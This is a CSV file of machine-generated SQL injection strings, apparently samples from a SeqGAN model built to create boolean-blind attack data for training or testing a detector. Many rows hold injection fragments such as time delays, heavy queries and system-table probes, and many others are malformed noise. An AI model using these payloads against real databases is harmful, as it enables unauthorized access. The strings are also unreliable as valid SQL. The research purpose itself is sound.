label,payload,family,payload_type,method,run_id,sample_index
attack,"1""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  'k%'  =  'a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,136
attack,1%'  )   and 3202  =  like  (  'akz,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,137
attack,1%'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   ''  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,138
attack,select comfrom where,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,139
attack,"1%%""'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,140
attack,1x,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,141
attack,"-4889""%""  =  """"caha""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,142
attack,1'||  (  select ')   where  azj nt  (  1%%'  )   and 3202  =  like  (  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,143
attack,select c  =  =  *  =unus  )vwhere,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,144
attack,"1""  f   ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,145
attack,1'))   and from 7046 mtarruen  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,146
attack,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""u",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,147
attack,"1%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '"" or make_set  (  9354  =  9354,7185  )   and """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,148
attack,"1'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  'rr'  )   and    (    (   '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,149
attack,1%'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   '  n    )ap,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,150
attack,1'  )   or 8384  =  like  (  '   8635e or 8363  =      *(    )'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +'   ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,151
attack,"-6561%,""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""pa"" like """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,152
attack,1'+  (  select 'kegizfmaj   ora,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,153
attack,"18482%%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,154
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,155
attack,select k8060 or 3455  =  ='  =  'select ip'   )    )    or 5903  =    (  'rs,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,156
attack,1%)   )   oru)ya,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,157
attack,select 3902   and 8635 3902    * or 2367 u,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,158
attack,-selecti/co or =a=  select z7046from c,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,159
attack,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   '2oka    (  *  select where c",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,160
attack,"   where ""  =  ""    or i )"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""s _'  =  'fm c",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,161
attack,"1%'+  (  select '4212r""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,162
attack,select count   m8514t  ( 2367  (  select,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,163
attack,1  '  )   and    (    (   ' y,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,164
attack,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'sk""  =  ""aza"" like ""     ( uf""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,165
attack,"-""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""roerdewabhvcove3902ou",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,166
attack,"1%"" or make_set  (  9354  =  9354,7185  )   and """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,167
attack,1%'||  (  select '   if1 8482  =  =  =  (  =  *,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,168
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,169
attack,select i)   from where    2072 i 4297  =  9687,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,170
attack,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  ''  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,171
attack,"1""a    )yzn  )   and 4123 em as",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,172
attack,"1%""  =  ""   case where 9643  =  "" like ""  =  ((az",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,173
attack,f5158,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,174
attack,select cecouun  =  (  =     or 9643,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,175
attack,1ugezu=(  select   counts 9687,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,176
attack,1%'  )   or 8384  =  like  (  'a'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,177
attack,"select3455 c    or dumaza"" like ""benlma",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,178
attack,"selectaurufgha""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,179
attack,1  )   anddkfqaw,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,180
attack,"""   )    )    or    (    (   ""x51588425   and d   3902 ' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'abrss 3902",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,181
attack,"-2583""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,182
attack,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""ezrke.svdsk_pikezs",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,183
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,184
attack,"""   )    )    or    (    (   ""select*) and 4212(  select  *  =    ( or",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,185
attack,"-1422%"")     and where dbm from where 2367  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,186
attack,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""krksj    =qun    azaj',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ')",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,187
attack,"c',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'coz=  =    )   2072 9643  =  select e",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,188
attack,"""   )    )    or    (    (   ""bvdxf",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,189
attack,"-""   )    )     )   or 6872  =  6872 and    (    (     (  ""' af",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,190
attack,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""%",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,191
attack,"   3018 counpe_mna"" like """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,192
attack,"1""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,193
attack,"-""  )   or make_set  (  9354  =  9354,7185  )   and   (  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,194
attack,select c or odbm =   count  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,195
attack,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'select where couk  =  =    u*  )   ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,196
attack,select   )   from aeor 3175      d  =      ),boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,197
attack,"1%)""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""rzgfaggaxzqand  or ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,198
attack,"1%%""  =  """" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""  and 4212( a7471 where fss",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,199
attack,1r   and    9687  =     or or 9643(   where,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,200
attack,1'+  (  select '  jasas bor 3902  =   unt,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,201
attack,"1""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qu  =  m   s 8407",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,202
attack,"-2583%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,203
attack,"1"" and and s 4297  (  =  dbmna",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,204
attack,"1"" 2633  )y   where 3202 erand 3202  =    ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,205
attack,"1%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%%fa""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,206
attack,"1"")   )   asakz.  =  =  = from",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,207
attack,1)   4212 where 2367  *n(   or or  (,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,208
attack,"-4641%%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,209
attack,1%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,210
attack,"-2583""'  )   and make_set  (  4551  =  6487,6487  )   and   (  '%'  )   and 3202  =  like  (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,211
attack,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +'a,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,212
attack,select c  3902 *  *  =(  =n    or or ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,213
attack,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugkr' like '"" like ""ezzqazwhere a 8421=",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,214
attack," 7471select guct  )xa""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""as p"" like ""b ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,215
attack,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  "" where or l8363 9643  db' like ' or co",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,216
attack,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""_rkz=or  and 8363 or lsm ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,217
attack,1')   a,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,218
attack,"select 3902  co and 2367  =    m""  =  ""   and  2223",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,219
attack,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""ufo where where   =  9687 c  =  *",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,220
attack,select%x    a  =    (  (   coun 2367,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,221
attack,'  )   and 3202  =  like  (  ' cou.nt  =  bf a||  (  select,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,222
attack,"--1422""  )   and al( andlllllb",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,223
attack,1'+  (  select 'u=  ) and d3202,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,224
attack,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ' 7471 9687 from 9643)    x  =    a  gn",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,225
attack,select   =    if or or c  (  'abcdefg'   where 2367,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,226
attack,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  ' or ""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  "" 2367  ' like 'db$lbm 8312  =",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,227
attack,"-""3596  )   krklikeap.rsawrz ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,228
attack,"1""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%'  )   and 3202  =  like  (  ' 7046   9643 and 2367or 9643( 8363  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,229
attack,"-46413596  'abcdefg'%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,230
attack,select 3902 where yalls m _  =  xr,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,231
attack,1'+  (  select 'de_fgq,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,232
attack,"1%!%j""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,233
attack,1%'  )   or 8384  =  like  (  'f%'  =  '9643,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,234
attack,select count  un     or =a(r( ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,235
attack,1'   )   2072 8421m  8421 ory   ( 8421  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,236
attack,"-(2583%""  =  """"  select da"" like ""hsv3455 mas",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,237
attack,1'+  (  select ' 2367  8421(  select * and 2223  =    (),boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,238
attack,select 4728n    =    )   a=),boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,239
attack,"-9688""  or 8312  )   gru) t  3175 2072",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,240
attack,  )   t   8189  =   eg  =,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,241
attack,"-""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,242
attack,select ee  =    (  select 3902a    8421n m,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,243
attack,"1'||  (  select '"" like ""b c(arkkxs",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,244
attack,1)   un      =     =( 9643  select *  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,245
attack,"""   )    )    or    (    (   ""3596 from 9643  *  ) where 2223  =  *  *",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,246
attack,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,247
attack,"-""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""    '  =  'z",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,248
attack,1'||  (  select 'select)   where and 4212 or 4212=  =  9687 ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,249
attack,      3902 2367  coj 3175u,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,250
attack,"1%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,251
attack,-3596%%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,252
attack,"select 7427t  =     (  =  (  =""  =  ""  =  =",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,253
attack,17552a,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,254
attack,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'bruh   as",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,255
attack,select 3902=  =  3902  * 8312(    )   9nor,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,256
attack,1,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,257
attack,1%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,258
attack,"select '  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  's""  =  ""i   from 2367  *   or i2072 8156",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,259
attack,-2912%'  )   and 3202  =  like  (  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,260
attack,1   and 4212)      = )    or  9643  i9687,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,261
attack,  * or ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,262
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ' or 2223  )   from  ct  4123 2367  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,263
attack,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""u(",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,264
attack,-1422'  )   and 3202  =  like  (  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,265
attack,"18459e=    8156  zf"" like ""r'  =  'f)   afromaz  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,266
attack,"1%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,267
attack,"-""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,268
attack,"-""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   "")   )",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,269
